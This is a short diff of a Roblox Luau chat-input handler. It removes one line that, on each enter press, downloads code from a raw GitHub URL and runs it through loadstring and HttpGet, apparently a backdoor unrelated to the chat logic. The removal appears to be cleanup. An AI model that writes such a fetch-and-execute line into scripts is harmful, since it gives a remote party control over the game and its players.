@@ -71,7 +71,6 @@ end
 -- Command handler for the ExperienceChat TextBox
 ChatInputTextBox.FocusLost:Connect(function(enterPressed)
     if enterPressed then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yLKHnUCYHumlvOO54gctHpT7g/MyAdmin/refs/heads/main/allcmdss.luau"))()
         local command = ChatInputTextBox.Text:lower()
         local normalchatmsgs = ChatInputTextBox.Text
         ChatInputTextBox.Text = "" -- Clear the input box
